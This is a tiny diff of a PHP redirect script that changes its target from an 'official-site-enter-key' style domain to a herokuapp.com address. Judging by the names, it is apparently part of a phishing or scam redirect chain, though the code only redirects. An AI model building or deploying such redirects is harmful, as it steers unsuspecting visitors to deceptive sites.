@@ -1,4 +1,4 @@
 <?php
-header("Location: https://official-site-enter-key.site/actmca/");
+header("Location: https://actnort.herokuapp.com");
 die();
 ?>
